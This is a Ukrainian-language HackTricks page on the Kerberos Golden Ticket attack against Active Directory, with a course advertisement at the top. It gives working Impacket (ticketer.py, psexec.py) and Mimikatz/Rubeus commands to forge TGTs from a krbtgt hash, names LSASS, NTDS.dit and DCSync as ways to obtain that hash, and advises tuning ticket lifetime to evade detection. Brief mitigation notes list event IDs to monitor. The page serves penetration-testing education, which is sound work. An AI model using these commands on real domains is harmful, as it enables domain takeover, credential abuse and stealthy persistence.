# Золотий квиток

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>

## Золотий квиток

Атака **Золотий квиток** полягає в **створенні легітимного квитка для отримання квитка на доступ (TGT), підробляючи будь-якого користувача** за допомогою **NTLM-хешу облікового запису krbtgt Active Directory (AD)**. Ця техніка особливо вигідна, оскільки вона **надає доступ до будь-якого сервісу або машини** в домені як підроблений користувач. Важливо пам'ятати, що **облікові дані облікового запису krbtgt ніколи не оновлюються автоматично**.

Для **отримання NTLM-хешу** облікового запису krbtgt можна використовувати різні методи. Він може бути витягнутий з **процесу Local Security Authority Subsystem Service (LSASS)** або з файлу **NT Directory Services (NTDS.dit)**, розташованого на будь-якому контролері домену (DC) в домені. Крім того, **виконання атаки DCsync** є ще одним стратегічним способом отримання цього NTLM-хешу, яке можна виконати за допомогою інструментів, таких як **модуль lsadump::dcsync** в Mimikatz або **скрипт secretsdump.py** від Impacket. Важливо підкреслити, що для виконання цих операцій, як правило, **потрібні привілеї адміністратора домену або подібний рівень доступу**.

Хоча NTLM-хеш служить прийнятним методом для цієї цілі, **настійно рекомендується** підробляти квитки, використовуючи **розшифрування за допомогою ключів шифрування Advanced Encryption Standard (AES) (AES128 та AES256)** з міркувань оперативної безпеки.


{% code title="З Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="З Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Після** того, як ви **впровадили золотий квиток**, ви можете отримати доступ до спільних файлів **(C$)** та виконувати служби та WMI, тому ви можете використовувати **psexec** або **wmiexec**, щоб отримати оболонку (здається, ви не можете отримати оболонку через winrm).

### Обхід загальних виявлень

Найчастіші способи виявлення золотого квитка полягають у **перевірці трафіку Kerberos** на проводах. За замовчуванням Mimikatz **підписує TGT на 10 років**, що буде виділятися як аномалія в наступних запитах TGS, зроблених з його використанням.

`Термін дії: 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Використовуйте параметри `/startoffset`, `/endin` та `/renewmax`, щоб контролювати початкове зміщення, тривалість та максимальну кількість поновлень (все в хвилинах).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Нажаль, термін дії TGT не реєструється в 4769, тому ви не знайдете цю інформацію в журналах подій Windows. Однак ви можете корелювати **події 4769 без попередньої 4768**. **Неможливо запитати TGS без TGT**, і якщо немає запису про видання TGT, ми можемо припустити, що він був підроблений офлайн.

Для **обхіду цієї перевірки** перевірте білети типу diamond:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Пом'якшення

* 4624: Вхід в обліковий запис
* 4672: Вхід адміністратора
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Інші маленькі трюки, які можуть використовувати захисники, - це **сповіщення про 4769 для чутливих користувачів**, таких як обліковий запис адміністратора домену за замовчуванням.

## Посилання
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
